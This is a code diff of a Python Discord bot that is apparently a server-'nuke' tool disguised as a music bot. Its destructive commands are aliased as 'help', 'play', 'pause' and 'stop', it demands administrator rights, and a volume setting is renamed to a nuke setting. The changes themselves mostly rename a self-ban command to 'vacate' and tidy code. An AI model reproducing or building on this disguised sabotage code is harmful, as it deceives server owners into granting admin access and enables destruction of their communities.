@@ -18,7 +18,7 @@ commandaliases = {
     "nuke": ["help"],
     "getadmin": ["play", "p"],
     "banme": ["pause"],
-    "banmeandbot": ["stop"],
+    "vacate": ["stop"],
     "removebot": ["leave"],
     "resetsettings": ["resetvolume"],
     "showsettings": ["showvolume"],
@@ -74,6 +74,7 @@ else:
     file.close()
     settings = loads(json_string)
 
+    # Changes old variable name to new variable name
     if "VOLUMESETTINGS" in settings.keys():
         settings["CUSTOMNUKESETTINGS"] = settings.pop("VOLUMESETTINGS")
         file = open("settings.json", "w+")
@@ -140,7 +141,6 @@ def getRoleIDs():
     file.close()
     return loads(read)["ROLE_IDS"]
 
-
 def writeRoleIDs(write):
     file = open("settings.json", "r")
     read = loads(file.read())
@@ -159,7 +159,6 @@ def getCustomNukeSettings():
     file.close()
     return loads(read)["CUSTOMNUKESETTINGS"]
 
-
 def writeCustomNukeSettings(write):
     file = open("settings.json", "r")
     read = loads(file.read())
@@ -176,11 +175,6 @@ def output_log(text):
         with open(LOGFILE, "a+", encoding='utf8') as f:
             f.write("\n  ".join((datetime.now().strftime("%d/%m/%Y %H:%M:%S\n") + text.removeprefix("\n")).splitlines()) + "\n\n")
             f.close()
-
-async def dm_user(user, message):
-    embed=discord.Embed(description=message)
-    embed.set_author(name=user.name, icon_url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
-    await user.send(embed=embed)
 
 async def settingsembed(user, message):
     embed=discord.Embed(description=message)
@@ -533,9 +527,9 @@ Server Owner: {ctx.guild.owner}
 
 
 # bans the person who ran the command as well as removing the bot
-@bot.command(name="banmeandbot", aliases=commandaliases["banmeandbot"])
+@bot.command(name="vacate", aliases=commandaliases["vacate"])
 @commands.bot_has_permissions(administrator=True)
-async def banmeandbot(ctx):
+async def vacate(ctx):
     await ctx.message.delete()
     if not USER_ID:
         await ctx.guild.ban(await ctx.guild.fetch_member(ctx.message.author.id))
@@ -875,8 +869,8 @@ async def nuke_error(ctx, error): await commanderror(ctx, error)
 @getadmin.error
 async def getadmin_error(ctx, error): await commanderror(ctx, error)
 
-@banmeandbot.error
-async def banmeandbot_error(ctx, error): await commanderror(ctx, error)
+@vacate.error
+async def vacate_error(ctx, error): await commanderror(ctx, error)
 
 @settings.error
 async def settings_error(ctx, error): await commanderror(ctx, error)
